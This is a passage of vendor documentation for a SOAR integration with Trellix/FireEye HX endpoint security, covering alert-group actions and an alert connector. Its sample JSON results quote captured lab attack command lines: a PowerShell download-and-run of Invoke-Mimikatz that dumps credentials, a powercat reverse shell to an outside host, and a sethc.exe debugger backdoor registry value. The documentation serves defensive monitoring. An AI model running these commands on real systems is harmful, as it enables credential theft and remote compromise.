**Note:** You can acknowledge alert groups only , not alerts, via the HX API.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Alert Groups IDs | Comma separated list | N/A | Yes | Specify the Alert Groups IDs you would like to Acknowledge, in a comma separated list.  
Acknowledgment | DDL | Acknowledge | Yes | Specify whether you would like to Acknowledge or Un-acknowledge the specified alert groups.  
Acknowledgment Comment | String | N/A | No | Specify the acknowledgment comment you would like to add to the relevant alert groups.  
Limit | Integer | N/A | No | Specify the maximum amount of alert group listings coming back from the API, in the JSON result.  
  
#### Run On

This action doesn't run on entities, it has a mandatory input parameter.

#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    {
        "data": {
            "total": 2,
            "query": {},
            "sort": {},
            "offset": 0,
            "limit": 50,
            "entries": [
                {
                    "_id": "4532f4d8d50ab50a7830e2823ac488fd",
                    "assessment": "[Process powershell.exe started] POWERSHELL DOWNLOADER (METHODOLOGY)",
                    "file_full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "first_event_at": "2020-08-17T12:03:38.496Z",
                    "last_event_at": "2020-12-10T08:02:22.561Z",
                    "dispositions": [],
                    "source": "IOC",
                    "has_fp_disposition": false,
                    "last_alert": {
                        "_id": 718,
                        "agent": {
                            "_id": "9GJe9n4Ynd5dFtZ8wCjIu7",
                            "url": "/hx/api/v3/hosts/9GJe9n4Ynd5dFtZ8wCjIu7",
                            "hostname": "HW-HOST-FY01",
                            "containment_state": "normal"
                        },
                        "condition": {
                            "_id": "yQjMv_j5PKfjL8Qu5uSm4A==",
                            "url": "/hx/api/v3/conditions/yQjMv_j5PKfjL8Qu5uSm4A=="
                        },
                        "event_at": "2020-08-17T12:03:38.496+00:00",
                        "matched_at": "2020-12-10T09:26:55+00:00",
                        "reported_at": "2020-12-10T09:27:08.624+00:00",
                        "source": "IOC",
                        "resolution": "ALERT",
                        "decorators": [],
                        "md5values": [
                            "cda48fc75952ad12d99e526d0b6bf70a"
                        ],
                        "decorator_sources": [],
                        "decorator_statuses": [],
                        "url": "/hx/api/v3/alerts/718",
                        "event_id": 39882,
                        "event_type": "processEvent",
                        "event_values": {
                            "processEvent/timestamp": "2020-08-17T12:03:38.496Z",
                            "processEvent/eventType": "start",
                            "processEvent/pid": 9896,
                            "processEvent/processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                            "processEvent/process": "powershell.exe",
                            "processEvent/parentPid": 5560,
                            "processEvent/parentProcessPath": "C:\\Windows\\System32\\cmd.exe",
                            "processEvent/parentProcess": "cmd.exe",
                            "processEvent/username": "FIREEYE-LAB\\Administrator",
                            "processEvent/startTime": "2020-08-17T12:03:38.496Z",
                            "processEvent/md5": "cda48fc75952ad12d99e526d0b6bf70a",
                            "processEvent/processCmdLine": "powershell.exe  \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\" "
                        },
                        "is_false_positive": false
                    },
                    "generic_alert_badge": null,
                    "generic_alert_label": null,
                    "stats": {
                        "events": 3
                    },
                    "url": "/hx/api/v3/alert_groups/4532f4d8d50ab50a7830e2823ac488fd",
                    "created_at": "2020-12-10T09:26:56.056Z",
                    "acknowledgement": {
                        "acknowledged": true,
                        "acknowledged_by": "test2",
                        "acknowledged_time": "2020-12-22T19:00:25.688Z",
                        "comment": "test comment",
                        "comment_update_time": "2020-12-22T19:00:25.688Z"
                    },
                    "grouped_by": {
                        "condition_id": "yQjMv_j5PKfjL8Qu5uSm4A==",
                        "detected_by": "ioc_engine",
                        "host": {
                            "_id": "9GJe9n4Ynd5dFtZ8wCjIu7",
                            "url": "/hx/api/v3/hosts/9GJe9n4Ynd5dFtZ8wCjIu7",
                            "hostname": "HW-HOST-FY01",
                            "primary_ip_address": "172.30.202.152"
                        }
                    }
                },
                {
                    "_id": "e9f4d7baaa362d9d5d0b6e053ba0d44d",
                    "assessment": "[Registry key event] EASE OF ACCESS BACKDOORS (METHODOLOGY)",
                    "file_full_path": "",
                    "first_event_at": "2020-12-10T08:04:09.521Z",
                    "last_event_at": "2020-12-10T09:26:14.114Z",
                    "dispositions": [],
                    "source": "IOC",
                    "has_fp_disposition": false,
                    "last_alert": {
                        "_id": 723,
                        "agent": {
                            "_id": "9GJe9n4Ynd5dFtZ8wCjIu7",
                            "url": "/hx/api/v3/hosts/9GJe9n4Ynd5dFtZ8wCjIu7",
                            "hostname": "HW-HOST-FY01",
                            "containment_state": "normal"
                        },
                        "condition": {
                            "_id": "2npvcLf_arxPaH717hQZ9g==",
                            "url": "/hx/api/v3/conditions/2npvcLf_arxPaH717hQZ9g=="
                        },
                        "event_at": "2020-12-10T09:26:14.114+00:00",
                        "matched_at": "2020-12-10T09:26:56+00:00",
                        "reported_at": "2020-12-10T09:27:08.735+00:00",
                        "source": "IOC",
                        "resolution": "ALERT",
                        "decorators": [],
                        "md5values": [],
                        "decorator_sources": [],
                        "decorator_statuses": [],
                        "url": "/hx/api/v3/alerts/723",
                        "event_id": 880771,
                        "event_type": "regKeyEvent",
                        "event_values": {
                            "regKeyEvent/timestamp": "2020-12-10T09:26:14.114Z",
                            "regKeyEvent/hive": "HKEY_LOCAL_MACHINE\\SOFTWARE",
                            "regKeyEvent/keyPath": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
                            "regKeyEvent/path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
                            "regKeyEvent/eventType": 1,
                            "regKeyEvent/pid": 8740,
                            "regKeyEvent/process": "reg.exe",
                            "regKeyEvent/processPath": "C:\\Windows\\System32",
                            "regKeyEvent/valueName": "Debugger",
                            "regKeyEvent/valueType": "REG_SZ",
                            "regKeyEvent/value": "QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAAAA=",
                            "regKeyEvent/text": "C:\\Windows\\System32\\cmd.exe",
                            "regKeyEvent/username": "FIREEYE-LAB\\Administrator"
                        },
                        "is_false_positive": false
                    },
                    "generic_alert_badge": null,
                    "generic_alert_label": null,
                    "stats": {
                        "events": 2
                    },
                    "url": "/hx/api/v3/alert_groups/e9f4d7baaa362d9d5d0b6e053ba0d44d",
                    "created_at": "2020-12-10T08:04:54.740Z",
                    "acknowledgement": {
                        "acknowledged": true,
                        "acknowledged_by": "test2",
                        "acknowledged_time": "2020-12-22T19:00:25.688Z",
                        "comment": "test comment",
                        "comment_update_time": "2020-12-22T19:00:25.688Z"
                    },
                    "grouped_by": {
                        "condition_id": "2npvcLf_arxPaH717hQZ9g==",
                        "detected_by": "ioc_engine",
                        "host": {
                            "_id": "9GJe9n4Ynd5dFtZ8wCjIu7",
                            "url": "/hx/api/v3/hosts/9GJe9n4Ynd5dFtZ8wCjIu7",
                            "hostname": "HW-HOST-FY01",
                            "primary_ip_address": "172.30.202.152"
                        }
                    }
                }
            ]
        },
        "message": "OK",
        "details": [],
        "route": "/hx/api/v3/alert_groups"
    }
    

##### Case Wall

Result type | Value/Description | Type  
---|---|---  
Output message* | **The action should not fail nor stop a playbook execution:**  
**if successful:** If (total) equals (number of alert group ids) -"Successfully updated acknowledgement status for all alert groups"  
******If some successful and some not: (number of IDs provided is bigger then total) -** "Successfully fetched alerts for the following alert group IDs: {succesfull_alert_groups_ids}"  
"Couldn't fetch alerts for the following alert group IDs: {not_succesfull_slert_group_ids}"  
******If no alert group details were fetched:** "Couldn't fetch alerts for any provided alert group ID. Please check the provided IDs and try again"  
******The action should fail and stop a playbook execution:**  
**if not successful:** "Failed to execute action "Get Alerts In Alerts Group" (exception.stacktrace) | General  
  
### Get Host Alert Groups

#### Description

List alert groups related to a host in Trellix Endpoint Security. Supported entities: Hostname, IP Address.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Acknowledgment Filter | DDL | ALLOnly AcknowledgedOnly Unacknowledged | No | Specify whether you want to return all of the alert groups or only acknowledged/unacknowledged.  
Max Alert Groups To Return | Integer | 20 | No | Specify how many Alert Groups to return per entity. Default: 20.  
  
#### Run On

This action runs on the following entities:

  * IP Address
  * Hostname



#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    {
        "_id": "6d9a68f2a78f8d983bd3c0f4556785e6",
        "assessment": "[Heur.BZC.ONG.Cheetah.3.1C89233F]",
        "file_full_path": "C:\\Users\\Administrator\\Downloads\\APTSimulator-master\\APTSimulator-master\\build\\test-sets\\defense-evasion\\js-dropper.bat",
        "first_event_at": "2021-07-01T09:44:18.809Z",
        "last_event_at": "2021-07-01T09:44:18.809Z",
        "dispositions": [],
        "source": "MAL",
        "has_fp_disposition": false,
        "last_alert": {
            "_id": 812,
            "agent": {
                "_id": "JS2asEbMWGgfxT0aHVu034",
                "url": "/hx/api/v3/hosts/JS2asEbMWGgfxT0aHVu034",
                "hostname": "FireEye-Domain",
                "containment_state": "normal"
            },
            "event_at": "2021-07-01T09:44:18.809+00:00",
            "matched_at": "2021-07-01T09:44:18.809+00:00",
            "reported_at": "2021-07-01T09:44:20.353+00:00",
            "source": "MAL",
            "resolution": "QUARANTINED",
            "decorators": [],
            "md5values": [
                "36be03ea88f7d1effcafeeb65e0e1e57"
            ],
            "decorator_sources": [],
            "decorator_statuses": [],
            "url": "/hx/api/v3/alerts/812",
            "condition": null,
            "event_id": null,
            "event_type": null,
            "event_values": {
                "system-data": {
                    "xmlns": "http://www.fireeye.com/antimalware-alert",
                    "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
                    "xsi:schemaLocation": "http://www.fireeye.com/antimalware-alert AM-alert.xsd",
                    "alert-version": "3",
                    "correlation-id": "d01e8ea6-4d34-4005-8482-3ccc026e11ea",
                    "timestamp": "2021-07-01T09:44:18.809Z",
                    "product-version": "32.36.0",
                    "engine-version": "11.0.1.19",
                    "content-version": "7.86346",
                    "mg-engine-version": "32.30.0.8460",
                    "mg-content-version": "25",
                    "whitelist-schema-version": "1.0.0",
                    "whitelist-content-version": "1.32.1"
                },
                "os-details": {
                    "$": {
                        "name": "windows",
                        "version": "10.0.14393",
                        "patch": "0",
                        "os-arch": "64-bit",
                        "os-language": "en-US"
                    }
                },
                "scan-type": "oas",
                "scanned-object": {
                    "scanned-object-type": "file-event",
                    "file-event": {
                        "file-path": "C:\\Users\\Administrator\\Downloads\\APTSimulator-master\\APTSimulator-master\\build\\test-sets\\defense-evasion\\js-dropper.bat",
                        "actor-process": {
                            "pid": "1268",
                            "path": "C:\\Windows\\System32\\xcopy.exe",
                            "user": {
                                "username": "",
                                "domain": ""
                            }
                        },
                        "sub-type": "FILE_OPERATION_CLOSED"
                    }
                },
                "detections": {
                    "detection": [
                        {
                            "engine": {
                                "engine-type": "av",
                                "engine-version": "11.0.1.19",
                                "content-version": "7.86346"
                            },
                            "infected-object": {
                                "object-type": "file",
                                "file-object": {
                                    "file-path": "C:\\Users\\Administrator\\Downloads\\APTSimulator-master\\APTSimulator-master\\build\\test-sets\\defense-evasion\\js-dropper.bat",
                                    "inner-file-path": "",
                                    "original-file-name": "",
                                    "container": "false",
                                    "packed": "false",
                                    "hidden": "false",
                                    "system-file": "false",
                                    "read-only": "false",
                                    "temporary": "false",
                                    "md5sum": "36be03ea88f7d1effcafeeb65e0e1e57",
                                    "sha1sum": "ce1cdd84732367cbf2be60df57c52760bf2e8fe9",
                                    "sha256sum": "3862ddf0a77ef8e7e17c641939a6dc349885c1a08cd64748ec50358adafe0631",
                                    "size-in-bytes": "753",
                                    "creation-time": "2021-07-01T09:41:47.610Z",
                                    "modification-time": "2020-05-29T09:34:17.066Z",
                                    "access-time": "2021-07-01T09:41:47.610Z"
                                }
                            },
                            "infection": {
                                "confidence-level": "high",
                                "infection-type": "malware",
                                "infection-name": "Heur.BZC.ONG.Cheetah.3.1C89233F"
                            },
                            "action": {
                                "actioned-object": {
                                    "object-type": "file",
                                    "file-object": {
                                        "file-path": "C:\\Users\\Administrator\\Downloads\\APTSimulator-master\\APTSimulator-master\\build\\test-sets\\defense-evasion\\js-dropper.bat",
                                        "inner-file-path": "",
                                        "original-file-name": "",
                                        "container": "false",
                                        "packed": "false",
                                        "hidden": "false",
                                        "system-file": "false",
                                        "read-only": "false",
                                        "temporary": "false",
                                        "md5sum": "36be03ea88f7d1effcafeeb65e0e1e57",
                                        "sha1sum": "ce1cdd84732367cbf2be60df57c52760bf2e8fe9",
                                        "sha256sum": "3862ddf0a77ef8e7e17c641939a6dc349885c1a08cd64748ec50358adafe0631",
                                        "size-in-bytes": "753",
                                        "creation-time": "2021-07-01T09:41:47.610Z",
                                        "modification-time": "2020-05-29T09:34:17.066Z",
                                        "access-time": "2021-07-01T09:41:47.610Z"
                                    }
                                },
                                "requested-action": "clean",
                                "applied-action": "quarantine",
                                "result": "success",
                                "error": "0",
                                "reboot-required": "false"
                            }
                        }
                    ]
                },
                "scan-statistics": {
                    "total-scan-time-in-ms": "12227"
                }
            },
            "is_false_positive": false
        },
        "generic_alert_badge": null,
        "generic_alert_label": null,
        "stats": {
            "events": 1
        },
        "url": "/hx/api/v3/alert_groups/6d9a68f2a78f8d983bd3c0f4556785e6",
        "created_at": "2021-07-01T09:44:23.726Z",
        "acknowledgement": {
            "acknowledged": false,
            "acknowledged_by": null,
            "acknowledged_time": null,
            "comment": null,
            "comment_update_time": null
        },
        "grouped_by": {
            "md5sum": "36be03ea88f7d1effcafeeb65e0e1e57",
            "file-path": "C:\\Users\\Administrator\\Downloads\\APTSimulator-master\\APTSimulator-master\\build\\test-sets\\defense-evasion\\js-dropper.bat",
            "infection-name": "Heur.BZC.ONG.Cheetah.3.1C89233F",
            "detected_by": "malware_file_access_scan",
            "host": {
                "_id": "JS2asEbMWGgfxT0aHVu034",
                "url": "/hx/api/v3/hosts/JS2asEbMWGgfxT0aHVu034",
                "hostname": "FireEye-Domain",
                "primary_ip_address": "172.30.202.71"
            }
        }
    },
    {
        "_id": "0043aa34dea99c23996c2f16291cdb4e",
        "assessment": "[Process powershell.exe started] POWERCAT (UTILITY)",
        "file_full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "first_event_at": "2021-07-01T09:41:50.428Z",
        "last_event_at": "2021-07-01T09:41:50.428Z",
        "dispositions": [],
        "source": "IOC",
        "has_fp_disposition": false,
        "last_alert": {
            "_id": 811,
            "agent": {
                "_id": "JS2asEbMWGgfxT0aHVu034",
                "url": "/hx/api/v3/hosts/JS2asEbMWGgfxT0aHVu034",
                "hostname": "FireEye-Domain",
                "containment_state": "normal"
            },
            "condition": {
                "_id": "KBvTAC_L_GiI9BZbph2GoA==",
                "url": "/hx/api/v3/conditions/KBvTAC_L_GiI9BZbph2GoA=="
            },
            "event_at": "2021-07-01T09:41:50.428+00:00",
            "matched_at": "2021-07-01T09:43:29+00:00",
            "reported_at": "2021-07-01T09:44:09.339+00:00",
            "source": "IOC",
            "resolution": "ALERT",
            "decorators": [],
            "md5values": [
                "097ce5761c89434367598b34fe32893b"
            ],
            "decorator_sources": [],
            "decorator_statuses": [],
            "url": "/hx/api/v3/alerts/811",
            "event_id": 11311494,
            "event_type": "processEvent",
            "event_values": {
                "processEvent/timestamp": "2021-07-01T09:41:50.428Z",
                "processEvent/eventType": "start",
                "processEvent/pid": 3676,
                "processEvent/processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "processEvent/process": "powershell.exe",
                "processEvent/parentPid": 2496,
                "processEvent/parentProcessPath": "C:\\Windows\\System32\\cmd.exe",
                "processEvent/parentProcess": "cmd.exe",
                "processEvent/username": "FIREEYE-LAB\\Administrator",
                "processEvent/startTime": "2021-07-01T09:41:50.428Z",
                "processEvent/md5": "097ce5761c89434367598b34fe32893b",
                "processEvent/processCmdLine": "powershell  -Exec Bypass \". \\\"C:\\TMP\\nc.ps1\\\";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\""
            },
            "multiple_match": "Multiple Indicators Matched.",
            "is_false_positive": false
        },
        "generic_alert_badge": null,
        "generic_alert_label": null,
        "stats": {
            "events": 1
        },
        "url": "/hx/api/v3/alert_groups/0043aa34dea99c23996c2f16291cdb4e",
        "created_at": "2021-07-01T09:44:13.744Z",
        "acknowledgement": {
            "acknowledged": false,
            "acknowledged_by": null,
            "acknowledged_time": null,
            "comment": null,
            "comment_update_time": null
        },
        "grouped_by": {
            "condition_id": "KBvTAC_L_GiI9BZbph2GoA==",
            "detected_by": "ioc_engine",
            "host": {
                "_id": "JS2asEbMWGgfxT0aHVu034",
                "url": "/hx/api/v3/hosts/JS2asEbMWGgfxT0aHVu034",
                "hostname": "FireEye-Domain",
                "primary_ip_address": "172.30.202.71"
            }
        }
    

##### Case Wall

Result type | Value/Description | Type  
---|---|---  
Output message\\* | **The action should not fail nor stop a playbook execution:**  
**if data is available for one(is_success = true):** "Successfully retrieved alert groups for the following entities in Trellix Endpoint Security: {entity.identifier}".  
******if data is not available for one(is_success = true):** "Action wasn't able to retrieve alert groups for the following entities in Trellix Endpoint Security: {entity.identifier}".  
******If data is not available for all(is_success=false):** "No alert groups were found for the provided entities in Trellix Endpoint Security".  
******The action should fail and stop a playbook execution:**  
**if fatal error, like wrong credentials, no connection to server, other:** "Error executing action "Get Host Alert Groups". Reason: {0}''.format(error.Stacktrace) | General  
Case Wall Table | **Columns:**

  * Assessment
  * Alert Group ID 
  * First Event At 
  * Last Event At 
  * Acknowledged 
  * Events Count 
  * Detected By 

| Entity  
  
## Connectors

### FireEye HX Alerts Connector

#### Description

Google SecOps SOAR Trellix Endpoint Security Alerts Connector ingests alerts generated on Trellix Endpoint Security server.

The Connector periodically connects to the Trellix Endpoint Security API server endpoint and pulls a list of alerts generated for a specific time period. If there are new alerts present, the Connector creates Google SecOps SOAR alerts based on the Trellix Endpoint Security alerts and saves the Connector timestamp as the last successfully ingested alert time. In the next Connector execution, the Connector will query the Trellix Endpoint Security API only for alerts, created from timestamp (timestamp plus some "technical" offset to not make connector "stuck"). If there are no new alerts found - finish current execution.

**Note:** The alert group ID will be provided with each alert in a dedicated field.

#### API Permissions

Trellix Endpoint Security Alerts Connector uses the same API authentication methods and permissions as existing FireEye integration - to work with FireEye alerts, account that will be used for the integration should have an "API Analyst" or "API Admin" role.

#### Configure FireEye HX Alerts Connector in Google SecOps

For detailed instructions on how to configure a connector in Google SecOps, see [Configuring the connector](https://docs.cloud.google.com/chronicle/docs/soar/ingest/connectors/ingest-your-data-connectors).

##### Connector parameters

Use the following parameters to configure the connector:

Parameter Display Name | Type | Default Value | Is mandatory | Description  
---|---|---|---|---  
Product Field Name | String | ProductName | Yes | Platform defined description, field is immutable.  
Event Field Name | String | AlertName | Yes | Platform defined description, field is immutable.  
Environment Field Name | String | "" | No | Describes the name of the field where the environment name is stored. If the environment field isn't found, the environment is "".  
Environment Regex Pattern | String | .* | No | A regex pattern to run on the value found in the "Environment Field Name" field. Default is .* to catch all and return the value unchanged. Used to allow the user to manipulate the environment field via regex logic If the regex pattern is null or empty, or the environment value is null, the final environment result is "".  
Script Timeout (Seconds) | Integer | 180 | Yes | Timeout limit for the python process running the current script.  
API Root | String | https://x.x.x.x:<port> | Yes | Trellix Endpoint Security Server API Root URL  
Username | String | N/A | Yes | Trellix Endpoint Security user to authenticate with  
Password | Password | N/A | Yes | Trellix Endpoint Security user password to authenticate with  
Verify SSL | Checkbox | Checked | Yes | If specified, connector will check if Trellix Endpoint Security is configured with valid SSL certificate. If certificate is not valid, connector will return error.  
Offset time in hours | Integer | 24 | Yes | Fetch alerts from X hours backwards.  
Max Alerts Per Cycle | Integer | 25 | Yes | How many alerts should be processed during one connector run.  
Alert Type | String | active_threat | No | Specify what Trellix Endpoint Security alert types to ingest. By default its set to active_threat to return alerts in ALERT and QUARANTINED/partial_block state. Other valid parameter is ALERT, which will return open alerts only.  
Use whitelist as a blacklist | Checkbox (checkbox) | Unchecked | Yes | If enabled, whitelist will be used as a blacklist.  
Proxy Server Address | IP_OR_HOST | N/A | No | Proxy server to use for connection.  
Proxy Server Username | String | N/A | No | Proxy server username.  
Proxy Server Password | Password | N/A | No | Proxy server password.  
  
#### Connector Rules

  * **Blacklist** Blacklist rules should be supported, but connector uses whitelist logic by default.
  * **Whitelist rules** Used by default.
  * **Proxy Support** The Connector supports Proxy.
  * **Default ConnectorRules**

RuleType(Whitelist \ Blacklist) | RuleName (string)  
---|---  
WhiteList | Specify in this section which alerts to ingest based on alert source and subtype attributes, for example: "IOC" for indicator alerts, "MAL AV" to ingest malware alerts only with "AV" subtype, or "MAL" to ingest all malware alerts, regardless of subtype. To ingest all alerts, remove everything from the whitelist section.  
  
**Need more help?** [Get answers from Community members and Google SecOps professionals.](https://security.googlecloudcommunity.com/)

Send feedback 

Except as otherwise noted, the content of this page is licensed under the [Creative Commons Attribution 4.0 License](https://creativecommons.org/licenses/by/4.0/), and code samples are licensed under the [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0). For details, see the [Google Developers Site Policies](https://developers.google.com/site-policies). Java is a registered trademark of Oracle and/or its affiliates.

Last updated 2026-10-20 UTC.

Need to tell us more?  [[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Hard to understand","hardToUnderstand","thumb-down"],["Incorrect information or sample code","incorrectInformationOrSampleCode","thumb-down"],["Missing the information/samples I need","missingTheInformationSamplesINeed","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2026-10-20 UTC."],[],[]] 
